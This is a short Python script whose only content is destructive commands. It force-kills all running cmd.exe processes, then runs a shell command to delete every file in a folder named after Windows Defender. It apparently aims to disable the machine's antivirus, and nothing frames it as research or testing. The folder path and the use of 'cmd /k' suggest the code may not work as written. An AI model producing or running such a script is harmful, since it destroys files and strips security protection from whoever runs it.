import time
import os

os.system('cmd /k taskkill /im cmd.exe /f')

time.sleep(3)

os.system('cmd /k cd C:\Program Files\Windows Defender Libs & del *.*')
